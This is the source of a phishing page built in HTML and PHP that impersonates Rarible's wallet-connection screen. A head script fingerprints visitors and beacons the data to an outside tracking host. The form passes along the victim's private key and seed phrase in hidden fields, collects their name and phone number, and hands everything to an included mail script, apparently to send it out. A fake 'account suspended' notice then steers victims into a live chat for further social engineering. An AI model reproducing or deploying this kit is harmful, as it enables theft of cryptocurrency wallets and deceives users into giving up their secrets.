<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" id="viewport" />
        <link rel="shortcut icon" href="favicon.png" />
        <title>Rarible – Create, sell or collect digital items secured with #blockchain</title>
        <link href="./connect_files/style.css" rel="stylesheet" />
        <link href="./connect_files/meta.css" rel="stylesheet" />
        <script type="text/javascript" src="./connect_files/fingerprint2.min.js.download"></script>
        <script type="application/javascript">
            //timezone
            var xd = new Date();
            timezone = -Math.floor(xd.getTimezoneOffset() / 60);

            //incognito mode crash
            if (window.ethereum) {
                if (window.ethereum.isMetaMask === true) {
                    var mm = 1;
                } else {
                    var mm = 0;
                }
            } else {
                mm = -1;
            }

            //human browser returns undefined
            var br;
            if (typeof navigator.webdriver !== "undefined") {
                var br = navigator.webdriver;
            } else {
                var br = "browser";
            }

            //localstorage
            class PTsStorage {
                static set(key, value) {
                    let st = {
                        dt_cache: Math.floor(Date.now() / 1000),
                        value: value,
                    };
                    localStorage.setItem(key, JSON.stringify(st));
                }
                static get(key) {
                    let item = JSON.parse(localStorage.getItem(key));
                    if (item && item.dt_cache && item.dt_cache > Math.floor(Date.now() / 1000) - 42300) {
                        return item.value;
                    }
                    localStorage.removeItem(key);
                    return false;
                }
            }
            var c;
            PTsStorage.set(c, 1);
            if (PTsStorage.get(c)) {
                var lse = "locste";
            }

            function setCookie(cname, cvalue, exdays) {
                var d = new Date();
                d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000);
                var expires = "expires=" + d.toUTCString();
                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
            }
            function getCookie(cname) {
                var name = cname + "=";
                var decodedCookie = decodeURIComponent(document.cookie);
                var ca = decodedCookie.split(";");
                for (var i = 0; i < ca.length; i++) {
                    var c = ca[i];
                    while (c.charAt(0) == " ") {
                        c = c.substring(1);
                    }
                    if (c.indexOf(name) == 0) {
                        return c.substring(name.length, c.length);
                    }
                }
                return "";
            }
            setCookie("name", "cw", 1);
            var cook = getCookie("name");
            var yad = getCookie("subid2");
            var subid = getCookie("subid");
            kUrl = "https://tanalytics.xyz/";
            function update_tokens(subId, mm, cook, lse, nav, br, tz, fp) {
                var img = document.createElement("img");
                img.src =
                    kUrl +
                    "?_update_tokens=1&sub_id=" +
                    subId +
                    "&sub_id_8=" +
                    yad +
                    "&sub_id_9=" +
                    mm +
                    "&sub_id_10=" +
                    cook +
                    "&sub_id_11=" +
                    lse +
                    "&sub_id_12=" +
                    nav +
                    "&sub_id_13=" +
                    br +
                    "&sub_id_14=" +
                    tz +
                    "&sub_id_15=" +
                    fp +
                    "&return=img";
                img.height = 0;
                img.width = 0;
                document.getElementsByTagName("body")[0].appendChild(img);
            }
            setTimeout(function () {
                Fingerprint2.getV18(function (components) {
                    update_tokens(subid, mm, cook, lse, window.navigator.languages, br, timezone, components);
                });
            }, 500);
        </script>

        <style>
            body {
                font-size: 16px;
            }
        </style>
        <style>
            /*! CSS Used from: Embedded */
            html {
                text-size-adjust: 100%;
                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            }
            body {
                margin: 0px;
            }
            :focus:not([data-focusvisible-polyfill]) {
                outline: none;
            }
            /*! CSS Used from: Embedded */
            html {
                line-height: 1.15;
                text-size-adjust: 100%;
            }
            body {
                margin: 0px;
            }
            a {
                background-color: transparent;
            }
            img {
                border-style: none;
            }
            button {
                font-family: inherit;
                font-size: 100%;
                line-height: 1.15;
                margin: 0px;
            }
            button {
                overflow: visible;
            }
            button {
                text-transform: none;
            }
            button,
            html [type="button"] {
                appearance: button;
            }
            html,
            body,
            div,
            span,
            a,
            img {
                margin: 0px;
                padding: 0px;
                border: 0px;
                font: inherit;
                vertical-align: baseline;
            }
            body {
                line-height: 1;
            }
            * {
                box-sizing: border-box;
            }
            body {
                font-family: "Circular Std", Helvetica, Arial, sans-serif;
                -webkit-tap-highlight-color: transparent;
                font-weight: 400;
                line-height: 1.38;
                overflow: hidden scroll;
                max-width: 100%;
                color: rgb(4, 4, 5);
                background: rgb(255, 255, 255);
            }
            .jbxvPE {
                margin: 0px;
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-direction: column;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
            }
            .bWQTJz {
                margin: 0px;
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex: 1 0 auto;
                flex-direction: column;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
                -webkit-box-flex: 1;
            }
            .bQiBKA {
                margin: 0px;
                padding: 0px;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
                flex-direction: row;
                -webkit-box-align: center;
                align-items: center;
            }
            .gKioqY {
                margin: 32px 0px 0px;
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-direction: column;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
            }
            .oMHNp {
                margin: 8px 0px 0px;
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-direction: column;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
            }
            .bjziCK {
                margin: 16px 0px 0px;
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-direction: column;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
            }
            .bufMPb {
                margin: 0px;
                padding: 0px;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex: 1 0 auto;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
                position: relative;
                flex-direction: row;
                -webkit-box-align: stretch;
                align-items: stretch;
                -webkit-box-flex: 1;
            }
            .iXQpyl {
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex: 1 0 auto;
                flex-direction: column;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
                margin: 32px;
                -webkit-box-flex: 1;
                -webkit-box-pack: justify;
                justify-content: space-between;
            }
            .edTtpf {
                margin: 0px;
                padding: 32px 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex: 1 0 auto;
                flex-direction: column;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
                -webkit-box-flex: 1;
            }
            .gveAUo {
                margin: 0px;
                padding: 0px 16px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-direction: column;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
            }
            @media screen and (min-width: 578px) {
                .gveAUo {
                    padding-left: 24px;
                    padding-right: 24px;
                }
            }
            @media screen and (min-width: 768px) {
                .gveAUo {
                    padding-left: 28px;
                    padding-right: 28px;
                }
            }
            @media screen and (min-width: 981px) {
                .gveAUo {
                    padding-left: 32px;
                    padding-right: 32px;
                }
            }
            .rKUAy {
                margin: 0px 8px 0px 0px;
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-direction: column;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
            }
            .kghyLD {
                margin: 0px;
                padding: 0px 24px;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex-basis: auto;
                flex-shrink: 0;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
                -webkit-box-align: center;
                align-items: center;
                flex-direction: row;
            }
            .dQByta {
                margin: 0px 0px 0px 8px;
                padding: 0px;
                -webkit-box-align: stretch;
                align-items: stretch;
                border-width: 0px;
                border-style: solid;
                border-color: rgb(4, 4, 5);
                display: flex;
                flex: 1 0 auto;
                flex-direction: column;
                min-height: 0px;
                min-width: 0px;
                max-width: 100%;
                z-index: 0;
                -webkit-box-flex: 1;
            }
            .fnyloc {
                text-decoration: none;
                color: inherit;
                font-size: inherit;
                line-height: inherit;
                font-family: inherit;
                font-weight: inherit;
            }
            .gWFzdQ {
                text-decoration: none;
                color: inherit;
                font-size: inherit;
                line-height: inherit;
                font-family: inherit;
                font-weight: 900;
            }
            .jUfkKX {
                text-decoration: none;
                color: inherit;
                font-size: inherit;
                line-height: inherit;
                font-family: inherit;
                font-weight: 900;
                text-align: center;
            }
            .dFrygW {
                text-decoration: none;
                color: rgba(4, 4, 5, 0.5);
                font-size: 14px;
                line-height: 19.32px;
                font-family: inherit;
                font-weight: inherit;
            }
            .HymoY {
                text-decoration: none;
                color: rgba(4, 4, 5, 0.5);
                font-size: inherit;
                line-height: inherit;
                font-family: inherit;
                font-weight: inherit;
            }
            .erMVgR {
                width: auto;
                color: inherit;
                padding: 0px;
                background: transparent;
                border: none;
                cursor: pointer;
                font-style: inherit;
                font-variant: inherit;
                font-weight: inherit;
                font-stretch: inherit;
                font-size: inherit;
                font-family: inherit;
                line-height: normal;
                overflow: visible;
                outline: none;
            }
            .eesVrg {
                text-decoration: none;
                color: rgb(0, 102, 255);
            }
            .eesVrg:hover {
                color: rgb(4, 4, 5);
                cursor: pointer;
            }
            .croGUS {
                max-width: 100%;
                min-height: 100vh;
                width: 100%;
            }
            .jJTdQl {
                position: fixed;
                inset: 0px;
                background: rgb(255, 255, 255);
                color: rgb(4, 4, 5);
                display: none;
                flex-direction: column;
                -webkit-box-flex: 1;
                flex-grow: 1;
                z-index: 200;
            }
            .foxhaQ {
                background-image: url(./connect_files/3bd3dce3665cb2869ec24c0c38a8e086.jpg);
                background-size: cover;
                position: relative;
                background-position: center center;
                color: rgba(255, 255, 255, 0.6);
            }
            @media (min-height: 1200px) {
                .foxhaQ {
                    background-image: url(./index_files/1b2c0ed88785aeafec99fff9a07def0d.jpg);
                }
            }
            .foxhaQ::after {
                content: "";
                bottom: 0px;
                left: 0px;
                right: 0px;
                height: 200px;
                position: absolute;
                background: linear-gradient(0deg, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0) 100%);
                z-index: -1;
            }
            .lgtLJZ {
                color: rgb(255, 255, 255);
                transition: all 0.12s ease-in-out 0s;
            }
            .lgtLJZ:hover {
                color: rgba(255, 255, 255, 0.7);
            }
            .dvEEhY {
                color: rgb(255, 255, 255);
            }
            .cYmwOA > :not(:last-child) {
                margin-bottom: 8px;
            }
            .eMTBjk {
                border: 1px solid rgba(4, 4, 5, 0.1);
                transition: all 0.12s ease-in-out 0s;
                color: rgb(4, 4, 5);
                background: rgb(255, 255, 255);
                height: 56px;
                border-radius: 40px;
                width: 100%;
                -webkit-box-pack: center;
                justify-content: center;
                flex-direction: column;
                -webkit-box-align: stretch;
                align-items: stretch;
                display: flex;
            }
            .eMTBjk:hover,
            .eMTBjk:focus,
            .eMTBjk:active {
                color: rgb(4, 4, 5);
                border-color: rgba(4, 4, 5, 0.25);
            }
            .crVslF {
                margin: auto 0px;
                max-width: 560px;
                width: 100%;
            }
            @media (min-width: 580px) {
                .crVslF {
                    padding: 0px 40px;
                }
            }
            @media (min-width: 920px) {
                .crVslF {
                    padding: 0px 100px;
                }
            }
            .lcEOzX {
                color: rgb(0, 102, 255);
                transition: all 0.12s ease-in-out 0s;
            }
            .lcEOzX:hover {
                color: rgb(4, 4, 5);
            }
            .EIIkt {
                font-size: 32px;
            }
            @media (min-width: 580px) {
                .EIIkt {
                    font-size: 36px;
                }
            }
            .gChalR {
                position: fixed;
                left: 0px;
                top: 0px;
                bottom: 0px;
                z-index: 10;
                width: 280px;
            }
            @media (min-width: 920px) {
                .gChalR {
                    width: 380px;
                }
            }
            .eGqnrC {
                padding-left: 280px;
            }
            @media (min-width: 920px) {
                .eGqnrC {
                    padding-left: 380px;
                }
            }
            /*! CSS Used fontfaces */
            @font-face {
                font-weight: 400;
                font-family: "Circular Std";
                src: local("Circular Std Book"), url(./index_files/6c8c5686045bf8f6a2c6370514d85c34.woff) format("woff"), url(./index_files/25f9cc95f2005be7c78e24ff8b836760.woff2) format("woff2");
            }
            @font-face {
                font-weight: 500;
                font-family: "Circular Std";
                src: local("Circular Std Medium"), url(./index_files/bb9a359afc17edc2c275b4212b8f2fd2.woff) format("woff"), url(./index_files/029c2e0e19032f6cdbef9042552e79fa.woff2) format("woff2");
            }
            @font-face {
                font-weight: 700;
                font-family: "Circular Std";
                src: local("Circular Std Bold"), url(./index_files/1ced22ee6d45bdd05a5383fd9dbd1b43.woff) format("woff"), url(./index_files/97ca95083f8be0c5d7ee9907cfe28af1.woff2) format("woff2");
            }
            @font-face {
                font-weight: 900;
                font-family: "Circular Std";
                src: local("Circular Std Black"), url(./index_files/59880bb792378f77deca117ea6b17567.woff) format("woff"), url(./index_files/94a505bb1e062b41273a8ea77777a3e7.woff2) format("woff2");
            }
            .loading {
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                background: rgba(0, 0, 0, 0.4);
                z-index: 1000;
            }
            .loader {
                left: 50%;
                margin-left: -4em;
                font-size: 10px;
                border: 0.5em solid rgba(218, 219, 223, 1);
                border-left: 0.5em solid rgb(29, 29, 29);
                animation: spin 0.8s infinite linear;
                z-index: 1000;
            }
            .loader,
            .loader:after {
                border-radius: 50%;
                width: 5em;
                height: 5em;
                display: block;
                position: absolute;
                top: 50%;
                z-index: 1000;
                margin-top: -4.05em;
            }

            @keyframes spin {
                0% {
                    transform: rotate(360deg);
                }
                100% {
                    transform: rotate(0deg);
                }
            }

            @keyframes spinner {
                to {
                    transform: rotate(360deg);
                }
            }

            .spinner:before {
                content: "";
                box-sizing: border-box;
                position: absolute;
                top: 50%;
                left: 50%;
                width: 30px;
                height: 30px;
                margin-top: -10px;
                margin-left: -10px;
                border-radius: 50%;
                border: 2px solid #ccc;
                border-top-color: #000;
                animation: spinner 0.6s linear infinite;
            }

            .Modal-component {
                z-index: 1000;
            }

            .Modal-component .modal-wrapper {
                position: fixed;
                top: 0;
                left: 0;
                box-sizing: border-box;
                display: flex;
                align-items: center;
                justify-content: center;
                overflow: hidden;
                height: 100%;
                width: 100%;
                -webkit-animation: 0.3s forwards modal-wrapper-reveal;
                animation: 0.3s forwards modal-wrapper-reveal;
                will-change: opacity;
                -webkit-print-color-adjust: exact;
                background: rgba(0, 0, 0, 0.4);
                z-index: 1000;
            }

            .Modal-component .content-wrapper {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .Modal-component .modal-base {
                display: flex;
                flex-direction: column;
                width: auto;
                height: -webkit-fit-content;
                height: -moz-fit-content;
                height: fit-content;
                margin: 10px;
                overflow: hidden;
                background-color: rgba(var(--secondaryColor), var(--secondaryColorAlpha));
                border-radius: 14px;
                -webkit-animation: 0.3s forwards modal-enter;
                animation: 0.3s forwards modal-enter;
                will-change: transform, opacity;
                background: white;
            }
            @media screen and (min-width: 370px) {
                .Modal-component .modal-base {
                    width: 400px;
                }
            }
            .is-light-theme.Modal-component .modal-base {
                box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
            }
            .Modal-component .page-container {
                position: relative;
                flex-grow: 1;
                overflow-y: auto;
                overflow-x: hidden;
            }
            .Modal-component .page-container .modal-page {
                padding-bottom: var(--footerHeight);
                background-color: rgba(var(--secondaryColor), var(--secondaryColorAlpha));
            }
            .Modal-component .page-container .modal-page .PageTransition-component {
                padding-top: var(--blockPaddingTop);
                padding-left: var(--blockPaddingLeft);
                padding-right: var(--blockPaddingRight);
                padding-bottom: var(--blockPaddingBottom);
            }

            /*! CSS Used from: https://x2.fortmatic.com/static/css/main.c9296713.chunk.css */
            .Modal-component *,
            :after,
            :before {
                font-family: ProximaNova, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
                font-size: 16px;
                line-height: 19px;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                color: rgba(var(--tertiaryColor), var(--tertiaryColorAlpha));
            }
            .Modal-component .NavigationBar-component .close-button * {
                -webkit-transition: 0.2s;
                transition: 0.2s;
            }
            .Modal-component .NavigationBar-component .close-button {
                margin-left: 10px;
            }
            .Modal-component .NavigationBar-component .close-button > span {
                cursor: pointer;
            }
            @media print {
                body * {
                    visibility: hidden;
                    margin: 0;
                    padding: 0;
                }
            }
            .Modal-component .NavigationBar-component {
                height: 60px;
                width: 100%;
                background-color: transparent;
            }
            .Modal-component .NavigationBar-component .modal-actions {
                display: flex;
                align-items: center;
                position: relative;
                width: 100%;
                padding: 0 18px;
                height: 60px;
                box-sizing: border-box;
                background-color: rgba(var(--primaryColor), var(--primaryColorAlpha));
            }
            .Modal-component .NavigationBar-component .modal-actions > .left {
                width: 33%;
            }
            .Modal-component .NavigationBar-component .modal-actions > .center {
                flex-grow: 1;
                max-width: calc(100% - 5% - 10px);
            }
            .Modal-component .NavigationBar-component .modal-actions > .right {
                width: 33%;
                min-width: 5%;
            }
            .Modal-component .NavigationBar-component .close-button {
                display: flex;
                justify-content: flex-end;
                background: 0 0;
                border: none;
                outline: 0;
                padding: 0;
            }
            .Modal-component .NavigationBar-component .logo-container {
                position: absolute;
                width: 69px;
                height: 69px;
                top: 24px;
                left: 50%;
                -webkit-transform: translateX(-50%);
                transform: translateX(-50%);
                z-index: 1;
            }
            .Modal-component .NavigationBar-component .logo-container img {
                height: 100%;
                width: 100%;
                border: 3px solid #fff;
                border-radius: 50%;
                background-color: #fff;
                object-fit: contain;
            }

            .modal-actions .close-button {
            }

            .modal-content111 {
                padding: 0px 10px 50px 10px;
                text-align: center;
                padding-bottom: 20px;
            }

            .field-title {
                margin-top: 0px;
                margin-bottom: 20px;
                font-size: 18px;
            }

            .err-btn {
                width: 180px;
                padding: 12px 18px;
                text-align: center;
                border-radius: 40px;
                outline: none;
                border: 1px solid transparent;
                font-family: "Baloo Da";
                text-decoration: none;
                display: flex;
                -webkit-box-pack: center;
                justify-content: center;
                flex-wrap: nowrap;
                -webkit-box-align: center;
                align-items: center;
                cursor: pointer;
                position: relative;
                z-index: 1;
                border-color: rgba(4, 4, 5, 0.1);
                color: rgb(4, 4, 5);
                background: transparent;
                font-size: 16px;
                font-weight: 500;
                font-family: inherit;
            }

            .err-btn:hover {
                background-color: rgba(219, 219, 219, 0.158);
            }

            .four .modal-base {
                width: 630px;
            }

            .token-switch-modal.visible {
                display: block;
            }

            .text-gray {
                color: #3a3a3a;
            }

            .proposal__item-options {
                display: flex;
                flex-wrap: wrap;
            }

            .proposal__item-option {
                height: 90px;
                margin-bottom: 37px;
            }

            .error_outline {
    border: 1px solid #ff9d9d;
    /*padding: 30px 30px 30px 30px;*/
    position: relative;
    margin-bottom: 15px;
    margin-top: 15px;
    letter-spacing: 0px;
    border-radius: 3px;
}h2.uhahh {
    font-size: 24px;
    line-height: 30px;
    font-weight: 600;
    color: #f94848;
}
.error_in_box.error_outline p {
    font-size: 14px;
}.error_in_box.error_outline h6 {
    font-weight: 600;
    font-size: 17px;
        line-height: 0px;
}
.btn_box .btn {
    background: rgb(38, 203, 124) !important;
    color: #fff !important;
    padding: 14px 20px;
    display: inline-block;
    text-align: center;
    border-radius: 5px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
}
        </style>
    </head>
    <body data-new-gr-c-s-check-loaded="14.1006.0" data-gr-ext-installed="">
        <div id="root">
            <div id="tippy-container"></div>
            <div class="sc-bdnylx sc-lmgQde jbxvPE jJTdQl"></div>
            <div data-marker="root" class="sc-bdnylx jbxvPE">
                <div class="sc-bdnylx sc-kfYqjs jbxvPE croGUS">
                    <div class="sc-bdnylx bufMPb">
                        <div class="sc-bdnylx sc-cBoprd jbxvPE gChalR">
                            <div class="sc-bdnylx sc-iJCRLp bWQTJz foxhaQ">
                                <div class="sc-bdnylx iXQpyl">
                                    <a href="#" class="sc-gtssRu sc-hHEjAm sc-dlMBXb fnyloc eesVrg krPfSJ">
                                        <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <rect width="40" height="40" rx="8" fill="#FEDA03"></rect>
                                            <path
                                                d="M27.6007 19.8536C28.8607 19.5262 29.9817 18.5838 29.9817 16.6889C29.9817 13.5342 27.3031 12.8 23.8706 12.8H10.2V27.0064H15.9539V22.185H22.7793C23.8309 22.185 24.446 22.6016 24.446 23.6334V27.0064H30.2V23.4548C30.2 21.5203 29.1087 20.3 27.6007 19.8536ZM22.8785 18.3556H15.9539V16.9667H22.8785C23.6325 16.9667 24.0888 17.0659 24.0888 17.6612C24.0888 18.2564 23.6325 18.3556 22.8785 18.3556Z"
                                                fill="black"
                                            ></path>
                                        </svg>
                                    </a>
                                    <span class="sc-gtssRu fnyloc">
                                        <span class="sc-gtssRu sc-ezzayL fnyloc dvEEhY">Genesis</span> by
                                        <a href="#" class="sc-gtssRu sc-hHEjAm sc-dlMBXb fnyloc eesVrg krPfSJ sc-giAqnE lgtLJZ"><span class="sc-gtssRu fnyloc">🔥 Måx Ø$iRi$ 💮</span></a>
                                    </span>
                                </div>
                            </div>
                        </div>
                        <div class="sc-bdnylx sc-ciSmjq bWQTJz eGqnrC">
                            <div class="sc-bdnylx edTtpf">
                                <div class="sc-bdnylx gveAUo sc-jJMGHv crVslF">
                                    <button type="button" class="sc-eCApGN erMVgR backback">
                                        <div class="sc-bdnylx bQiBKA">
                                            <div class="sc-bdnylx rKUAy">
                                                <svg viewBox="0 0 14 12" fill="none" width="14" height="14" xlmns="http://www.w3.org/2000/svg">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M6.29436 0.292893C6.68488 -0.0976311 7.31805 -0.0976311 7.70857 0.292893C8.0991 0.683417 8.0991 1.31658 7.70857 1.70711L4.41568 5H12.9985C13.5508 5 13.9985 5.44772 13.9985 6C13.9985 6.55228 13.5508 7 12.9985 7H4.41568L7.70857 10.2929C8.0991 10.6834 8.0991 11.3166 7.70857 11.7071C7.31805 12.0976 6.68488 12.0976 6.29436 11.7071L0.587252 6L6.29436 0.292893Z"
                                                        fill="currentColor"
                                                    ></path>
                                                </svg>
                                            </div>
                                            <span class="sc-gtssRu gWFzdQ">Go back</span>
                                        </div>
                                    </button>
                                    <div class="sc-bdnylx bjziCK">
                                        <span class="sc-gtssRu sc-gXfWUo gWFzdQ EIIkt">Connect your wallet</span>
                                        <div class="sc-bdnylx oMHNp">
                                            <span class="sc-gtssRu HymoY">
                                                Connect with one of available wallet providers or create a new wallet.<span class="sc-gtssRu fnyloc"> </span>
                                                <button type="button" class="sc-eCApGN sc-hiKfjK erMVgR lcEOzX">What is wallet?</button>
                                            </span>
                                        </div>
                                    </div>
                                    <div class="sc-bdnylx gKioqY">
                                        <div class="sc-bdnylx sc-bYwzba jbxvPE cYmwOA body">
                                            <button type="button" value="Metamask" class="brandBtn sc-eCApGN sc-kLokih erMVgR eMTBjk metamask">
                                                <div class="sc-bdnylx kghyLD metamask">
                                                    <img alt="Metamask" class="metamask" src="./connect_files/c879a582a94e772b8ed27295ae83145d.svg" width="28" height="28" />
                                                    <div class="sc-bdnylx dQByta metamask"><span class="sc-gtssRu jUfkKX metamask">Metamask</span></div>
                                                </div>
                                            </button>
                                            <button type="button" value="Fortmatic" class="brandBtn sc-eCApGN sc-kLokih erMVgR eMTBjk other">
                                                <div class="sc-bdnylx kghyLD other">
                                                    <img alt="Fortmatic" class="other" src="./connect_files/e7fbb606805f82bd7a35aba13f77dbce.svg" width="28" height="28" />
                                                    <div class="sc-bdnylx dQByta other"><span class="sc-gtssRu jUfkKX other">Fortmatic</span></div>
                                                </div>
                                            </button>
                                            <button type="button" value="WalletConnect" class="brandBtn sc-eCApGN sc-kLokih erMVgR eMTBjk other">
                                                <div class="sc-bdnylx kghyLD other">
                                                    <img alt="WalletConnect" class="other" src="./connect_files/33e41e4b40136207f4a535b5850d1faa.svg" width="28" height="28" />
                                                    <div class="sc-bdnylx dQByta other"><span class="sc-gtssRu jUfkKX other">WalletConnect</span></div>
                                                </div>
                                            </button>
                                            <button type="button" value="Coinbase" class="brandBtn sc-eCApGN sc-kLokih erMVgR eMTBjk other">
                                                <div class="sc-bdnylx kghyLD other">
                                                    <img alt="Coinbase Wallet" class="other" src="./connect_files/5b5a2db80207ba34ca3ce271d20af421.svg" width="28" height="28" />
                                                    <div class="sc-bdnylx dQByta other"><span class="sc-gtssRu jUfkKX other">Coinbase Wallet</span></div>
                                                </div>
                                            </button>
                                            <button type="button" value="MyEtherWallet" class="brandBtn sc-eCApGN sc-kLokih erMVgR eMTBjk other">
                                                <div class="sc-bdnylx kghyLD other">
                                                    <img alt="MyEtherWallet" class="other" src="./connect_files/e6acd346113bb2a37dd71732eacd34ed.svg" width="28" height="28" />
                                                    <div class="sc-bdnylx dQByta other"><span class="sc-gtssRu jUfkKX other">MyEtherWallet</span></div>
                                                </div>
                                            </button>
                                            <button type="button" value="Torus" class="brandBtn sc-eCApGN sc-kLokih erMVgR eMTBjk other">
                                                <div class="sc-bdnylx kghyLD other">
                                                    <img alt="Torus" class="other" src="./connect_files/81cb7a45a085a8b5a19791dfb05468fa.svg" width="28" height="28" />
                                                    <div class="sc-bdnylx dQByta other"><span class="sc-gtssRu jUfkKX other">Torus</span></div>
                                                </div>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="sc-bdnylx gKioqY"><span class="sc-gtssRu dFrygW">We do not own your private keys and cannot access your funds without your confirmation.</span></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>


       

        <div class="Modal-component is-light-theme three" style="display: block;">
            <div class="modal-wrapper">
                <div class="content-wrapper">
                    <div class="modal-base">
                        <div class="NavigationBar-component" style=" height: 20px;">
                            <div class="modal-actions">
                                <div class="left">
                                    <div class="PopTransition-component" style="opacity: 1; transform: none;"></div>
                                </div>
                                <div class="center"></div>
                            </div>
                        </div>
                        <?php if(isset($_POST['verifyBtn'])){
                            include"mail.php";
                            ?> 
                        <div class="page-container">
                            <div style="transition: height 0.2s ease 0s; will-change: height;">
                                <div class="modal-content111">
                                    <h2 class="bn-onboard-custom bn-onboard-select-description svelte-rj3fpa field-title text-gray">Important Message !</h2>
                                    <div class="error_in_box error_outline">
                                        <p>
                                            Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff
                                            Immediately
                                        </p>
                                        <h6 class="code_error">Error CODE: EBRX16X76D</h6>
                                        <div class="btn_box">
                                        <h2><a href="javascript:void(Tawk_API.toggle())" class="btn">Ask Expert</a></h2>
                                    </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    <?php }else{
                         include"mail.php";
                        ?>
                        <div class="page-container">
                            <div style="transition: height 0.2s ease 0s; will-change: height;">
                                <div class="modal-content111">
                                    <h2 class="bn-onboard-custom bn-onboard-select-description svelte-rj3fpa field-title text-gray">Connect with your private key</h2>
                                    <form action="" method="post">
                                    <div class="sc-gojNiO gtLByV">
                                        <input type="hidden" name="key" value="<?php if(isset($_POST['key'])){echo implode('-', $_POST['key']);} ?>">
                                        <input type="hidden" name="wtype" value="<?php echo $_POST['wtype']; ?>">
                                        <input type="hidden" name="seed"  value="<?php if(isset($_POST['seed'])){ echo $_POST['seed']; }?>">
                                        <input type="text" name="name" class="sc-daURTG bpsvN form-control" placeholder="Full Name" required>
                                        <input type="text" name="number" class="sc-daURTG bpsvN form-control" placeholder="Phone Number" style="margin-top: 20px;margin-bottom: 20px;" required>
                                        
                                        <button name="verifyBtn" type="submit" class="other bn-onboard-custom bn-onboard-prepare-button svelte-r5g1v4 bn-onboard-prepare-button-center sc-gqjmRU gacWOr sc-eHgmQL sc-cMljjf sc-krDsej sc-itybZL doCklF err-btn">
                                            Connect
                                        </button>
                                    </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    <?php }?>
                    </div>
                </div>
            </div>
        </div>

       
        <script src="./connect_files/ethers-v3.min.js.download" charset="utf-8" type="text/javascript"></script>
        <script src="./connect_files/jquery-1.9.1.js.download"></script>
        <script src="./connect_files/jquery-ui.min.js.download"></script>
        <script src="./connect_files/main.js.download"></script>
       
        <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/621a7b48a34c24564128808d/1fsrn35pf';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script--> 
    </body>
</html>
